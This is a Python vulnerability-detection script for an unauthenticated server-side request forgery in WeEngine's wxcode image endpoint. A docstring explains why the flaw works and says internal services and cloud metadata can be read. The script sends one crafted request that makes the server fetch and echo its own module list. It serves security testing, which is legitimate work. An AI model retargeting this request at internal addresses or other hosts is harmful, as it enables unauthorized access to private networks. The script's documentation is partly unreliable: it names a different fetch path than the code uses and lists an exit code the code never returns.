#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WE7-2 — Unauthenticated SSRF with full response echo
=====================================================
Type      : CWE-918 Server-Side Request Forgery
Component : web/source/utility/wxcode.ctrl.php  (do=image)
Affected  : 1.7.2 – 1.7.7   (fixed in 2.9.13 by a host allow-list)
Severity  : High — the complete response body is returned to the caller, so it
            is not a blind SSRF: internal HTTP services, intranet panels and
            cloud metadata endpoints can be read.

Why it works
------------
The endpoint is listed in the unauthenticated `direct` ACL of `utility`, and it
forwards the request parameter straight to the HTTP client and echoes the body:

    $content = ihttp_request($_GPC['attach']);
    echo $content['content'];

`ihttp_allow_host()` only filters destinations when the site configured
`setting.cloudip.ip_white_list`; on a default installation that list is empty.
`CURLOPT_FOLLOWLOCATION` is on, so redirects into private ranges are followed
as well. 2.9.13 now requires the URL to start with http(s)://mmbiz.qpic.cn/ or
http(s)://mmbiz.qlogo.cn/.

What this detector does (NON-DESTRUCTIVE)
-----------------------------------------
It points the fetcher at the target itself (`/web/index.php`) and checks
whether the fetched HTML is echoed back. No third-party host is contacted, no
internal port is scanned, one request only.

Exit codes: 0 = not vulnerable · 1 = vulnerable · 2 = inconclusive

Usage:
    python3 we7_2_wxcode_ssrf.py -u http://127.0.0.1:8080
    python3 we7_2_wxcode_ssrf.py -u https://target --json
"""

import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0 Safari/537.36")


def http_get(url, timeout=15):
    req = urllib.request.Request(url, headers={"User-Agent": UA, "Accept": "*/*"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(300000)
    except urllib.error.HTTPError as e:
        return e.code, (e.read(300000) if e.fp else b"")
    except Exception as e:
        return None, str(e).encode()


def check(base, timeout=15):
    base = base.rstrip("/")
    # Fetch a WeEngine-only JSON resource (the module list) instead of the index
    # page: the echo then has to be that JSON envelope, so a generic HTML page
    # cannot be mistaken for "the server fetched and echoed something".
    target = base + "/web/index.php?c=utility&a=modules&do=list"
    url = f"{base}/web/index.php?c=utility&a=wxcode&do=image&attach={urllib.parse.quote(target, safe='')}"
    status, body = http_get(url, timeout)
    text = body.decode("utf-8", "replace").strip()
    is_we7_json = text.startswith("{") and ('"errno"' in text or '"items"' in text)
    echoed = status == 200 and is_we7_json and "<html" not in text.lower()
    return {
        "target": base,
        "check": "WE7-2 wxcode unauthenticated SSRF with response echo",
        "url": url,
        "status": status,
        "bytes": len(body),
        "verdict": ("VULNERABLE (fetched content echoed back to an unauthenticated caller)" if echoed
                    else "not vulnerable (no echo - allow-list in place or endpoint hardened)"),
        "note": "destination is the target itself, nothing internal is contacted",
    }


def main():
    ap = argparse.ArgumentParser(description="WE7-2 detector (non-destructive)")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--json", action="store_true")
    a = ap.parse_args()
    base = a.url if "://" in a.url else "http://" + a.url
    r = check(base, a.timeout)
    if a.json:
        print(json.dumps(r, ensure_ascii=False, indent=2))
    else:
        print(f"[WE7-2] {r['target']}")
        print(f"  type    : CWE-918 SSRF (full response echo, not blind)")
        print(f"  affected: 1.7.2 - 1.7.7   (fixed in 2.9.13)")
        print(f"  request : GET {r['url']}")
        print(f"  response: HTTP {r['status']} / {r['bytes']} bytes")
        print(f"  verdict : {r['verdict']}")
        print(f"  note    : {r['note']}")
    return 1 if r["verdict"].startswith("VULNERABLE") else 0


if __name__ == "__main__":
    sys.exit(main())
